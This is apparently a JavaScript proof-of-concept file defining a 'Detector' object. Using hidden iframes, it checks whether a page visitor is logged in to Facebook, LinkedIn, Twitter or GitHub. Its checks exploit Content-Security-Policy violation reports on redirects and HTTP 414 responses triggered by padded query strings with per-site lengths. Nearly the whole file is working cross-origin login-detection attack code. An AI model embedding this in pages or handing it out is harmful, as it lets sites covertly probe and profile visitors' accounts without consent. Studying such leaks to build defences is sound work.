Detector = {
  callbacks: [],
  constants: {
    facebook: 'https://www.facebook.com/messages/new',
    linkedin: 'https://www.linkedin.com/people/pymk',
    twitter: 'https://twitter.com/i/notifications',
    github: 'https://github.com/notifications'
  },
  payloads: {
    facebook: 30998,
    linkedin: 4247,
    twitter: 6990,
    github: 5000
  },
  timeout: 15000,

  init: function(){
    window.addEventListener('message', function(e){
      var channel = Detector.callbacks[e.data[0]]
      channel(e.data[1]);
      Detector.callbacks[e.data[0]] = []
    })
  },

  doesRedirect: function(url, callback, use414){

    console.log(url)
    // making an invisible iframe for our experiments
    var ifr = document.createElement('iframe');
    ifr.style.display='none';

    document.body.appendChild(ifr);
    

    new_callback = function(s){
      callback(s);
      document.body.removeChild(ifr);
    }
    

    if(use414){

      num = Detector.callbacks.push(new_callback) - 1;

      ifr.src = "data:text/html,<iframe onload='r=false;try{x=this.contentWindow.location.href}catch(e){r=true;};parent.postMessage(["+num+",r],\"*\");' src='"+url+"'></iframe>";
  

    }else{
      num = Detector.callbacks.push(new_callback) - 1;
      
      // limiting CSP scope to url and see if it leads to violation

      ifr.src = "data:text/html,<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self' 'unsafe-inline' "+url+";\"><script>cb=function(s){console.log(s);parent.postMessage(["+num+",s],'*')}<"+"/script><script src=\""+url+"\" onload=\"cb(false)\" onerror=\"cb(true)\"><"+"/script>";
    }
  },



  checkLogin: function(network, callback, use414){
    if(use414){
      var url = this.constants[network]+'?'+Array(this.payloads[network]).join('a');
    }else{
      var url = this.constants[network];
    }
    this.doesRedirect(url, callback, use414);
  },
}
